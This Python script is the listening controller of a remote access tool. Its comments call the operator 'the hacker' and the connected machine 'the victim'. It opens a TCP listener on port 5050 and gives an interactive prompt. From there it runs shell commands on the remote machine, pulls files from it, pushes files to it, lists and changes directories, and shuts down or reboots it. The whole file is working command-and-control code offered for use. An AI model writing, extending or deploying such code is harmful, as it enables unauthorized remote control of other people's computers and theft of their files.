import socket
import sys 
import os 
from colorama import *
from tqdm import tqdm

# check if the history file exist
# if true skip it
# if false make it
for file in os.listdir():
    if file == '.history':
        history_file = open('.history', 'w+')
        break
    else:
        history_file = open('.history', 'w+')

# colors
BLUE = Fore.LIGHTBLUE_EX
RED = Fore.LIGHTRED_EX
GREEN = Fore.LIGHTGREEN_EX
WHITE = Fore.WHITE
YELLOW = Fore.LIGHTYELLOW_EX
RESET = Style.RESET_ALL

# connection
HOST_NAME = socket.gethostname()
HOST = socket.gethostbyname(HOST_NAME)
PORT = 5050

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

while True:
    try:
        client, address = server.accept()
    except:
        print("NO CONNECTION !")
    else:
        print("CONNECTION !")
        break

while True:
    command = str(input("[+] Admin~$ "))
    if command != '' and not command.isspace():
        history_file.write(f"{command}\n")
    
    # clear screen
    if command == 'clear':
        os.system('clear')

    # clear history file
    elif command == 'clear history':
        history_file.truncate(0)

    # print history file
    elif command == 'history':
        history_file.seek(0)
        for index, line in enumerate(history_file.readlines()):
            print(f"{index} {line.strip()}")

    # send file 
    elif command.startswith('send '):
        filename = command[5:]
        try:
            total_size = os.path.getsize(filename)
            client.send(command.encode())
            client.send(f"{total_size:<16}".encode())  # send filesize first
        
            with open(filename, 'rb') as f, tqdm(total=total_size, unit='B', unit_scale=True, desc=filename) as progress:
                while (chunk := f.read(1024)):
                    client.send(chunk)
                    progress.update(len(chunk))
            print(f"{GREEN}[+] File '{filename}' sent successfully{RESET}")
        except FileNotFoundError:
            print(f"{RED}[!] File not found: {filename}{RESET}")

    # execute command remotly
    elif command == 'shell':
        client.send(command.encode())
        client.send(str(input("[+] Enter command\n~$ ")).encode())
        print(client.recv(1024).decode())

    # get file_name 
    elif command.startswith('get '):
        filename = command[4:]
        client.send(command.encode())
    
        # Receive filesize from server (16 bytes)
        total_size = int(client.recv(16).decode())
        if total_size == 0:
            print(f"{RED}[!] File not found on server{RESET}")
            continue
    
        with open(filename, 'wb') as f, tqdm(total=total_size, unit='B', unit_scale=True, desc=filename) as progress:
            received = 0
            while received < total_size:
                data = client.recv(min(1024, total_size - received))
                if not data:
                    break
                f.write(data)
                received += len(data)
                progress.update(len(data))
        print(f"{GREEN}[+] File '{filename}' downloaded successfully{RESET}")

    # get directory list content
    elif command == 'ls':
        client.send(command.encode())
        print(client.recv(1024).decode())

    # get current work directory (getcwd)
    elif command == 'pwd':
        client.send(command.encode())
        print(client.recv(1024).decode())

    # shutdown the computer
    elif command == 'shutdown':
        client.send(command.encode())

    # reboot the computer
    elif command == 'reboot':
        client.send(command.encode())
    
    # get the hacker host
    elif command == 'host':
        print(f"Host : {HOST}")
    
    # get the hacker host-name
    elif command == 'host-name':
        print(f"HostName : {HOST_NAME}")
    
    # get the victim host
    elif command == 'vhost':
        client.send(command.encode())
        print(f"VHost : {client.recv(1024).decode()}")
    
    # get the victim host-name
    elif command == 'vhost-name':
        client.send(command.encode())
        print(f"VHostName : {client.recv(1024).decode()}")

    # change directory
    elif command.startswith('cd '):
        client.send(command.encode())
    
    # get platform type
    elif command == 'platform':
        client.send(command.encode())
        print(client.recv(1024).decode())

    # exit remote
    elif command == 'exit':
        history_file.close()
        print("0:KILL TERMINAL")
        client.send('exit'.encode())
        break

    # is space
    elif command.isspace() or command == '':
        pass

    # Unkown command
    else:
        print(f'{RED}[!] unkown command{RESET}')

history_file.close()
server.close()
sys.exit()
